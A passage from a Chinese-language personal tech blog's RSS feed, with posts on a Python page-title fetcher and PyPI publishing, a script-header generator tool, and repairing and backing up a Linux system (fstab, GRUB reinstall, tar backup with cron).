    &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_handle_refresh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mechanize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPRefreshProcessor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max_time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addheaders&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;User-agent&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#print br.title()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_uris_from_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#从文件中获取所有uri&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#print content&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;allurls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;(http(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S)+)&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;allurls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#print allurls&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allurls&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_title_from_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#等到文件中的所有uri对应的title&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;target_allurls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_uris_from_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;a output file:/tmp/result.txt&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;writed_urls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_allurls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/result.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;http_domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheme&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;://&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hostname&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_title_from_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http_domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http_domain&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;writed_urls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;each_line_to_write&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http_domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;upon uri is:&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each_line_to_write&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each_line_to_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;writed_urls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http_domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-&quot;&gt;0x03 模块发布&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;pypi register
2&amp;gt;eg.
mkdir /root/mypypi
cd /root/mypypi
python setup.py register
vi exp10it.py
vi setup.py
--------------setup.py-------------
from distutils.core import setup
setup(
    name=&#39;exp10it&#39;,
    version=&#39;1.0.11&#39;,
    packages=[&#39;&#39;],
    url=&#39;https://3xp10it.github.io&#39;,
    license=&#39;&#39;,
    author=&#39;quanyechavshuo&#39;,
    author_email=&#39;quanyechavshuo@gmail.com&#39;,
    description=&#39;My pipy module&#39;
)
----------------end----------------
python setup.py sdist upload
(upload时会有warning提示没有找到__init__.py文件等,经测试通过pip install exp10it可完美利用,也即此warning可忽略)

update时只需:
cd /root/mypypi
vi exp10it.py
vi setup.py
    set version to a higher one
python setup.py sdist upload
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 03 Aug 2016 00:00:00 +0800</pubDate>
        <link>/python/2016/08/03/%E6%9E%84%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84python%E6%A8%A1%E5%9D%97/</link>
        <guid isPermaLink="true">/python/2016/08/03/%E6%9E%84%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84python%E6%A8%A1%E5%9D%97/</guid>
        
        <category>script</category>
        
        <category>python</category>
        
        <category>module</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>便捷写python脚本</title>
        <description>&lt;h3 id=&quot;x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目的:方便快速写python脚本
相关:在脚本中打印logo及部分常用代码
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-code&quot;&gt;0x01 code&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---------------newpy.py------------------
#############################################################
###
###  mm         .m   mm  &#39;   .
### &#39; &#39;[. . .m,  ]  .`&#39;,.m  .dm
###  .m` b[ ]`T  ]  ] ,[ ]   ]
###   &#39;[ d, ] ]  ]  ]  [ ]   ]
### &#39;md`.`\ ]bP .dm  bd .dm  &#39;m
###         ]
###         &#39;
###
### name: newpy.py
### function: write new python script easily
### date: 2016-08-04
### author: quanyechavshuo
### blog: https://3xp10it.github.io
#############################################################
# -*- coding: utf-8 -*-
import sys
reload(sys)
sys.setdefaultencoding(&#39;utf-8&#39;)
#upon 4 lines for chinese support
import time
from exp10it import *
figlet2file(&quot;3xp10it&quot;,&quot;/tmp/figletpic&quot;,True)
time.sleep(1)

import os
import datetime
def check_file_has_logo(file_abs_path):
    unsucceed=os.system(&#39;&#39;&#39;grep -r &quot;#upon 4 lines for chinese support\\\nimport time\\\nfrom exp10it import \*&quot; %s&#39;&#39;&#39; % file_abs_path)
    if(unsucceed==1):
        return False
    else:
        return True

def write_code_header_to_file(file_abs_path,function,date,author,blog):
    f=open(file_abs_path,&quot;a+&quot;)
    first_line=&quot;#############################################################\n&quot;
    f.write(first_line)
    f.close()
    figlet2file(&quot;3xp10it&quot;,file_abs_path,False)
    f=open(file_abs_path,&quot;a+&quot;)
    all=f.readlines()
    f.close()
    f=open(&quot;/tmp/1&quot;,&quot;a+&quot;)
    for each in all:
        if(each[0:40]!=&quot;#&quot;*40):
            f.write(&quot;### &quot;+each)
        else:
            f.write(each)
    f.close()
    os.system(&quot;cat /tmp/1 &amp;gt; %s &amp;amp;&amp;amp; rm /tmp/1&quot; % file_abs_path)
    #os.system(&quot;cat %s&quot; % file_abs_path)

    f=open(file_abs_path,&quot;a+&quot;)
    filename=os.path.basename(file_abs_path)

    f.write(&quot;###                                                          \n&quot;)
    f.write(&quot;### name: %s&quot; % filename+&#39;\n&#39;)
    f.write(&quot;### function: %s&quot; % function+&#39;\n&#39;)
    f.write(&quot;### date: %s&quot; % str(date)+&#39;\n&#39;)
    f.write(&quot;### author: %s&quot; % author+&#39;\n&#39;)
    f.write(&quot;### blog: %s&quot; % blog+&#39;\n&#39;)
    f.write(&quot;#############################################################\n&quot;)
    f.write(&#39;&#39;&#39;# -*- coding: utf-8 -*-\nimport sys\nreload(sys)\nsys.setdefaultencoding(&#39;utf-8&#39;)\n#upon 4 lines for chinese support\nimport time\nfrom exp10it import *\nfiglet2file(&quot;3xp10it&quot;,&quot;/tmp/figletpic&quot;,True)\ntime.sleep(1)\n\n&#39;&#39;&#39;)
    f.close()

def insert_code_header_to_file(file_abs_path,function,date,author,blog):
    all_lines=[]
    f=open(file_abs_path,&quot;a+&quot;)
    all_lines=f.readlines()
    f.close()
    write_code_header_to_file(&quot;/tmp/2&quot;,function,date,author,blog)
    f=open(&quot;/tmp/2&quot;,&quot;a+&quot;)
    for each in all_lines:
        f.write(each)
    f.close()
    os.system(&quot;cat /tmp/2 &amp;gt; %s &amp;amp;&amp;amp; rm /tmp/2&quot; % file_abs_path)
    filename=os.path.basename(file_abs_path)
    os.system(&quot;sed -i &#39;s/### name: %s/### name: %s/g&#39; %s&quot; % (&#39;2&#39;,filename,file_abs_path))


def main():
    while 1:
        print &quot;1&amp;gt;write a new script&quot;
        print &quot;2&amp;gt;open and edit a exist script&quot;
        print &quot;your chioce:1/2 default[1]:&amp;gt;&quot;,
        tmp=raw_input()
        if(tmp!=str(2)):
            print &quot;please input your file_abs_path:&amp;gt;&quot;,
            file_abs_path=raw_input()
            if(os.path.exists(file_abs_path)==True):
                print &quot;file name exists,u need to change the file name,or if you really want the name,it will replace the original file!!!&quot;
                print &quot;replace the original file? Or you want to edit(e/E for edit) the file direcly?&quot;
                print &quot; y/n/e[N]:&amp;gt;&quot;,
                choose=raw_input()
                if(choose!=&#39;y&#39; and choose!=&#39;Y&#39; and choose!=&#39;e&#39; and choose!=&#39;E&#39;):
                    continue
                elif(choose==&#39;y&#39; or choose==&#39;Y&#39;):
                    os.system(&quot;rm %s&quot; % file_abs_path)
                    print &quot;please input the script function:)&quot;
                    function=raw_input()
                    date=datetime.date.today()
                    author=&quot;quanyechavshuo&quot;
                    blog=&quot;https://3xp10it.github.io&quot;

                    insert_code_header_to_file(file_abs_path,function,date,author,blog)

                    break
            print &quot;please input the script function:)&quot;
            function=raw_input()
            date=datetime.date.today()
            author=&quot;quanyechavshuo&quot;
            blog=&quot;https://3xp10it.github.io&quot;
            insert_code_header_to_file(file_abs_path,function,date,author,blog)
            break
        else:
            print &quot;please input your file_abs_path to edit:&amp;gt;&quot;,
            file_abs_path=raw_input()
            if os.path.exists(file_abs_path) is False:
                print &quot;file not exist,do you want to edit it and save it as a new file?[y/N] default[N]:&amp;gt;&quot;,
                choose=raw_input()
                if choose==&#39;y&#39; or choose==&#39;Y&#39;:
                    if(&quot;exp10it.py&quot;!=os.path.basename(file_abs_path)):
                        print &quot;please input the script function:)&quot;
                        function=raw_input()
                        date=datetime.date.today()
                        author=&quot;quanyechavshuo&quot;
                        blog=&quot;https://3xp10it.github.io&quot;

                        insert_code_header_to_file(file_abs_path,function,date,author,blog)
                        break
                    else:
                        print &quot;warning! you are edit a new file named &#39;exp10it&#39;,this is special,you know it&#39;s your python module&#39;s name,so I will exit:)&quot;


                else:
                    continue
            else:
                if(False==check_file_has_logo(file_abs_path) and &quot;exp10it.py&quot;!=os.path.basename(file_abs_path)):
                    print &quot;please input the script function:)&quot;
                    function=raw_input()
                    date=datetime.date.today()
                    author=&quot;quanyechavshuo&quot;
                    blog=&quot;https://3xp10it.github.io&quot;
                    insert_code_header_to_file(file_abs_path,function,date,author,blog)
                    break
                else:
                    break

    os.system(&quot;vim %s&quot; % file_abs_path)
    print &quot;do you want this script upload to github server? Y/n[Y]:&quot;
    choose=raw_input()
    if choose!=&#39;n&#39;:
        print &quot;please input your remote repository name:)&quot;
        repo_name=raw_input()
        succeed=save2github(file_abs_path,repo_name,function)
        if(succeed==0):
            print &quot;all is done and all is well!!!&quot;
        else:
            print &quot;save2github wrong,check it,maybe your remote repository name input wrong...&quot;

if __name__==&#39;__main__&#39;:
    main()
----------------end----------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-attention&quot;&gt;0x02 attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;sys.getsizeof(str):得到str的字节数

2&amp;gt;由于figlet打印出的logo的字符中有非ascii码,用sys.getsizeof()得到字节大小,但是非ascii在终端显示时,即使是相同的字节数的字符串,在终端的显示的&quot;占位长度&quot;不同

3&amp;gt;代码中的from exp10it import *中的exp10it为自己的模块

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 03 Aug 2016 00:00:00 +0800</pubDate>
        <link>/python/2016/08/03/%E4%BE%BF%E6%8D%B7%E5%86%99python%E8%84%9A%E6%9C%AC/</link>
        <guid isPermaLink="true">/python/2016/08/03/%E4%BE%BF%E6%8D%B7%E5%86%99python%E8%84%9A%E6%9C%AC/</guid>
        
        <category>script</category>
        
        <category>python</category>
        
        <category>logo</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>修复linux系统</title>
        <description>&lt;h3 id=&quot;x00-good-knowledge&quot;&gt;0x00 good knowledge:&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.xitongzhijia.net/xtjc/20141208/32106.html
https://www.linuxidc.com/Linux/2015-05/117031.htm
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-etcfstab-wrong&quot;&gt;0x01 /etc/fstab wrong&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;安装linux系统到u盘
eg.ubuntu: use yumi
eg.kali linux2: use win32diskimager

2&amp;gt;start os from usb
fdisk -l
    output:/dev/sda1 is the boot linux location
    设备       启动     Start    末尾    扇区   Size Id 类型
    /dev/sda1  *         2048  39178239  39176192  18.7G 83 Linux
    /dev/sda2        39180286 488396799 449216514 214.2G  5 扩展
    /dev/sda5        39180288 101679103  62498816  29.8G 82 Linux 交换 / Solaris
    /dev/sda6       101681152 488396799 386715648 184.4G 83 Linux
    
    Disk /dev/sdb: 1.8 TiB, 2000398934016 bytes, 3907029168 sectors
    Units: sectors of 1 * 512 = 512 bytes
    Sector size (logical/physical): 512 bytes / 4096 bytes
    I/O size (minimum/optimal): 4096 bytes / 4096 bytes
    Disklabel type: dos
    Disk identifier: 0x0585b847

    设备       启动 Start     末尾     扇区  Size Id 类型
    /dev/sdb1        2048 3907028991 3907026944  1.8T  5 扩展
    /dev/sdb5        4096 3907028991 3907024896  1.8T 83 Linux

vi /etc/fstab
    # /etc/fstab: static file system information.
    #
    # Use &#39;blkid&#39; to print the universally unique identifier for a
    # device; this may be used with UUID= as a more robust way to name devices
    # that works even if disks are added and removed. See fstab(5).
    #
    # &amp;lt;file system&amp;gt; &amp;lt;mount point&amp;gt;   &amp;lt;type&amp;gt;  &amp;lt;options&amp;gt;       &amp;lt;dump&amp;gt;  &amp;lt;pass&amp;gt;
    # / was on /dev/sda6 during installation
    UUID=404e86ae-84e2-4e70-8317-f6731637b4b1 /               ext4    errors=remount-ro 0       1
    # /boot was on /dev/sda1 during installation
    UUID=ff639af0-1f08-4fb3-9dc1-734fea98cdfc /boot           ext4    defaults        0       2
    # swap was on /dev/sda5 during installation
    UUID=662e8f85-fea5-4e66-939a-de769a05c326 none            swap    sw              0       0

modify as this:

UUID=404e86ae-84e2-4e70-8317-f6731637b4b1 /
to
/dev/sda6 /

UUID=ff639af0-1f08-4fb3-9dc1-734fea98cdfc /boot
to
/dev/sda1 /boot

UUID=662e8f85-fea5-4e66-939a-de769a05c326 none
to
/dev/sda5

shutdown -r 0

或者用df -h,blkid /dev/sda1,blkid /dev/sda6,blkid /dev/sda5分别查看uuid后修改
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-boot-wrong&quot;&gt;0x02 boot wrong&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;start os from usb with linux system
2&amp;gt;fdisk -l
    output is the same as upon fdisk -l
3&amp;gt;mkdir /mnt/tmp
4&amp;gt;mkdir /mnt/tmp/boot
5&amp;gt;mount /dev/sda6 /mnt/tmp(这一步是多余的，因为下面的5执行后，/mnt/tmp中自然会有boot文件夹)
6&amp;gt;mount /dev/sda1 /mnt/tmp/boot
7&amp;gt;mount --bind /dev /mnt/tmp/dev
8&amp;gt;mount --bind /proc /mnt/tmp/proc
9&amp;gt;mount --bind /sys /mnt/tmp/sys
10&amp;gt;chroot /mnt/tmp
11&amp;gt;grub-install /dev/sda
12&amp;gt;grub-mkconfig -o /boot/grub/grub.cfg
13&amp;gt;vi /etc/fstab
    if /etc/fstab is not ok,change the uuid=xxxxx to /dev/sd? as upon 0x01 does
14&amp;gt;exit
15&amp;gt;umount /mnt/tmp/dev &amp;amp;&amp;amp; umout /mnt/tmp/proc &amp;amp;&amp;amp; umount /mnt/tmp/sys &amp;amp;&amp;amp; umount /mnt/tmp/boot &amp;amp;&amp;amp;  umount /mnt/tmp(this step15 is not a must step)
16&amp;gt;shutdow -r 0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-system-backup-automatically&quot;&gt;0x03 system backup automatically&lt;/h3&gt;

&lt;p&gt;1&amp;gt;condition
first mount another disk(for bakup store) to /media/root/files&lt;/p&gt;

&lt;p&gt;2&amp;gt;ubuntubak.sh&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if [ ! -d /media/root/files ]; then
    echo &quot;bak folder not exist,the bakup device is not ready,check it&quot;
elif [ -d /media/root/files/ -a -d /media/root/files/ubuntubak/ ]; then
    tar cvpzf /media/root/files/ubuntubak/ubuntubak.tgz --exclude=/proc --exclude=/lost+found --exclude=/ubuntubak.tgz --exclude=/mnt --exclude=/sys --exclude=/media --exclude=/root/.cache /
elif [ -d /media/root/files/ -a ! -d /media/root/files/ubuntubak ]; then
    mkdir /media/root/files/ubuntubak
    tar cvpzf /media/root/files/ubuntubak/ubuntubak.tgz --exclude=/proc --exclude=/lost+found --exclude=/ubuntubak.tgz --exclude=/mnt --exclude=/sys --exclude=/media --exclude=/root/.cache /
fi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;3&amp;gt;alias&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cp ubuntubak.sh /usr/share
vi .zshrc
+alias ubuntubak=&quot;bash /usr/share/ubuntubak.sh&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;4&amp;gt;auto backup every month&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;in ubuntu 16.04:
如果cron没有开机自启动:
    vi /etc/rc.local
    service cron start
    exit 0
crontab -e
add one line:
# m h  dom mon dow   command
0  0    9 * *   root    rm /media/root/files/ubuntubak/ubuntubak.tgz;bash /usr/share/mytools/ubuntubak.sh
:wq
实现每个月9号备份系统
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-system-restore&quot;&gt;0x04 system restore&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;实验环境:
    ubuntu 16.04 live-usb

1&amp;gt;用live-cd或live-usb安装一个同样的新的操作系统
    必须用live-cd(live-usb)重装系统才能进行下面正常的还原步骤
    因为用live-cd(live-usb)重装系统的过程有两个关键的地方:
        新建分区表
        重构mbr
        mbr与grub:
            mbr是硬盘的一个引导区,而grub是一个引导程序!在mbr中有一段空间需要编写引导程序!grub只是引导程序的一种!
            如果grub够小的话,直接写在mbr中,就可以引导操作系统了!如果grub太大,在只能写一部分在mbr了
            http://www.linuxidc.com/Linux/2013-07/87923.htm
